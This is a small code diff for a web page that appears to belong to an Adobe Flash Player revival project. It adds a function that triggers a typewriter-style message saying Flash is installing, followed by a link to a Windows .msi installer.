@@ -1,3 +1,6 @@
+  function InstallChromium() {
+	  window.location = "javascript:typeWriter()";
+  }
         var i = 0;
 	var txt = "Adobe Flash is now installing.      Please stand by.                                                                                                                                                    https://josephcrosmanplays532.github.io/adobeFlashPlayerRevival/sources/flash_windows_chromium.msi";
 	var speed = 50;
